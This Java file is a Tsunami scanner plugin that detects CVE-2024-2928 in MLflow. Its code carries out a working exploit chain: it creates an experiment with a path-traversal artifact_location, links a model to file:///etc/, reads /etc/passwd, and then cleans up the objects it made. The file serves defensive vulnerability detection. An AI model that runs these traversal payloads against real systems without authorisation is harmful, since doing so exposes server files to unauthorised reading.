/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve20242928;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.delete;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonObject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2024-2928 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2024-2928 Detector",
    version = "0.1",
    description = "Checks for occurrences of CVE-2024-2928 in MLflow instances.",
    author = "frkngksl",
    bootstrapModule = Cve20242928DetectorBootstrapModule.class)
@ForWebService
public final class Cve20242928VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private static final String EXP_CREATION_PATH = "ajax-api/2.0/mlflow/experiments/create";
  private static final String RUN_CREATION_PATH = "api/2.0/mlflow/runs/create";
  private static final String MODEL_CREATION_PATH = "ajax-api/2.0/mlflow/registered-models/create";
  private static final String LINK_PATH = "ajax-api/2.0/mlflow/model-versions/create";
  private static final String EXP_DELETION_PATH = "api/2.0/mlflow/experiments/delete";
  private static final String MODEL_DELETION_PATH = "ajax-api/2.0/mlflow/registered-models/delete";

  private static final String EXP_PAYLOAD =
      "{\"name\": \"poc\", \"artifact_location\":"
          + " \"http:///#/../../../../../../../../../../../../../../etc/\"}";
  private static final String RUN_PAYLOAD = "{\"experiment_id\": \"{{EXPERIMENT_ID}}\"}";
  private static final String MODEL_PAYLOAD = "{\"name\": \"poc\"}";
  private static final String LINK_PAYLOAD =
      "{\"name\": \"poc\", \"run_id\": \"{{RUN_ID}}\", \"source\": \"file:///etc/\"}";

  private static final String VULN_PATH =
      "model-versions/get-artifact?path=passwd&name=poc&version=1";
  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("(root:[x*]:0:0:)");

  private String experimentId;
  private String runId;

  private static HttpClient httpClient;

  @Inject
  Cve20242928VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    Cve20242928VulnDetector.httpClient =
        checkNotNull(httpClient, "HttpClient cannot be null.")
            .modify()
            .setFollowRedirects(false)
            .build();
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(Cve20242928VulnDetector::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private static boolean checkMlflowFingerprint(NetworkService networkService) {
    String targetWebAddress = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    var request = HttpRequest.get(targetWebAddress).withEmptyHeaders().build();

    try {
      HttpResponse response = httpClient.send(request, networkService);
      return response.status().isSuccess()
          && response
              .bodyString()
              .map(body -> body.contains("<title>MLflow</title>"))
              .orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        && checkMlflowFingerprint(networkService);
  }

  private boolean createExperiment(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + EXP_CREATION_PATH;
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(EXP_PAYLOAD))
                  .build(),
              networkService);
      logger.atInfo().log("Response from experiment creation: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
        return false;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("experiment_id")) {
        this.experimentId = jsonResponse.get("experiment_id").getAsString();
        logger.atInfo().log("Created Experiment ID: %s", this.experimentId);
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean createRunForExperiment(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + RUN_CREATION_PATH;
    String requestBody = RUN_PAYLOAD.replace("{{EXPERIMENT_ID}}", this.experimentId);

    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(requestBody))
                  .build(),
              networkService);
      logger.atInfo().log("Response from run creation: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
        return false;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("run")) {
        JsonObject jsonInRunKey = jsonResponse.get("run").getAsJsonObject();
        if (jsonInRunKey.keySet().contains("info")) {
          JsonObject jsonInInfoKey = jsonInRunKey.get("info").getAsJsonObject();
          if (jsonInInfoKey.keySet().contains("run_id")) {
            this.runId = jsonInInfoKey.get("run_id").getAsString();
            logger.atInfo().log("Created Run ID: %s", this.runId);
            return true;
          }
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean createModel(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + MODEL_CREATION_PATH;
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(MODEL_PAYLOAD))
                  .build(),
              networkService);
      logger.atInfo().log("Response from model creation: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
        return false;
      }

      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("registered_model")) {
        JsonObject jsonInRegisteredModelKey =
            jsonResponse.get("registered_model").getAsJsonObject();
        if (jsonInRegisteredModelKey.keySet().contains("name")
            && jsonInRegisteredModelKey.get("name").getAsString().equals("poc")) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean createLinkForModel(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + LINK_PATH;
    String requestBody = LINK_PAYLOAD.replace("{{RUN_ID}}", this.runId);

    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(requestBody))
                  .build(),
              networkService);
      logger.atInfo().log("Response from linking model: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
        return false;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("model_version")) {
        JsonObject jsonInModelVersionKey = jsonResponse.get("model_version").getAsJsonObject();
        if (jsonInModelVersionKey.keySet().contains("status")
            && jsonInModelVersionKey.get("status").getAsString().equals("READY")) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean readLocalFile(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VULN_PATH;

    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetWebAddress).withEmptyHeaders().build(), networkService);
      logger.atInfo().log("Vulnerability Response: %s", httpResponse.bodyString().get());
      String responseBody = httpResponse.bodyString().get();
      if (httpResponse.status().isSuccess()
          && VULNERABILITY_RESPONSE_PATTERN.matcher(responseBody).find()) {
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private void deleteModel(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + MODEL_DELETION_PATH;
    try {
      HttpResponse httpResponse =
          httpClient.sendAsIs(
              delete(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(MODEL_PAYLOAD))
                  .build());
      if (httpResponse.status().code() == 200) {
        logger.atInfo().log("Clean Model is successful");
      }
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
    }
  }

  private void deleteExperiment(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + EXP_DELETION_PATH;
    String requestBody = RUN_PAYLOAD.replace("{{EXPERIMENT_ID}}", this.experimentId);
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(requestBody))
                  .build());
      if (httpResponse.status().code() == 200) {
        logger.atInfo().log("Clean Experiment (%s) is successful", this.experimentId);
      }
    } catch (Exception e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    logger.atInfo().log("First Step as Experiment Creation");
    if (!createExperiment(networkService)) {
      return false;
    }

    logger.atInfo().log("Second Step as Run Creation");
    if (!createRunForExperiment(networkService)) {
      deleteExperiment(networkService);
      return false;
    }
    logger.atInfo().log("Third Step as Model Creation");
    if (!createModel(networkService)) {
      deleteExperiment(networkService);
      return false;
    }
    logger.atInfo().log("Fourth Step as Model Linking");
    if (!createLinkForModel(networkService)) {
      deleteExperiment(networkService);
      deleteModel(networkService);
      return false;
    }
    logger.atInfo().log("Last Step as Reading Local File");
    if (!readLocalFile(networkService)) {
      deleteExperiment(networkService);
      deleteModel(networkService);
      return false;
    }
    deleteExperiment(networkService);
    deleteModel(networkService);
    return true;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2024_2928"))
                .addRelatedId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("CVE")
                        .setValue("CVE-2024-2928"))
                .setSeverity(Severity.HIGH)
                .setTitle("CVE-2024-2928 MLflow Local File Inclusion")
                .setDescription(
                    "A Local File Inclusion (LFI) vulnerability was identified in mlflow,"
                        + " which was fixed in version 2.11.2. This vulnerability arises from the"
                        + " application's failure to properly validate URI fragments for directory"
                        + " traversal sequences such as '../'. An attacker can exploit this flaw by"
                        + " manipulating the fragment part of the URI to read arbitrary files on"
                        + " the local file system, including sensitive files like '/etc/passwd'."
                        + " The vulnerability is a bypass to a previous patched vulnerability"
                        + " (namely for CVE-2023-6909) that only addressed similar manipulation"
                        + " within the URI's query string.")
                .setRecommendation("You can upgrade your MLflow instances to 2.11.2 or later."))
        .build();
  }
}
